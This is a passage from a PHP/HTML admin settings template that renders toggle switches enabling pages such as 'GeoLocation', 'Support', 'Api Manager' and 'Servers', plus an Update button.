                      ?>
                                      <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">Friends & Enemies Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="fe" <?php echo $fe1; ?>><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($geolocation == 1){
                        $geo = "checked";
                        } else {
            $geo = 'unchecked';
            
                      }
                      ?>
                                      <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">GeoLocation Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="geolocation" <?php echo $geo; ?>><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($support == 1){
                        $support1 = "checked";
                        } else {
            $support1 = 'unchecked';
            
                      }
                      ?>
                                      <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">Support Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="support" <?php echo $support1; ?>><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($apimanager == 1){
                        $api = "checked";
                        } else {
            $api = 'unchecked';
            
                      }
                      ?>
                                        <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">Api Manager Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="apimanager" <?php echo $api; ?>><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($servers == 1){
                        $server = "checked";
                        } else {
            $server = 'unchecked';
            
                      }
                      ?>
                                        <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">Servers Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="servers" <?php echo $server; ?>><span></span></label>
                                          </div>
                                      </div>
                                         
                                          <center><fieldset>
       <div class="form-group form-actions">
                                                      <form action="" method="POST">
                                                 <button name="ChangeBtn" class="btn btn-primary" type="submit">Update</button>

                                              </div>

                                          <div class="form-group form-actions">
                                              <div class="col-md-9 col-md-offset-3">
                                      
                                              </div>
                                          </div>
                                      </form>
                                      <!-- END Input States Content -->
                                  </div>
                                   </div>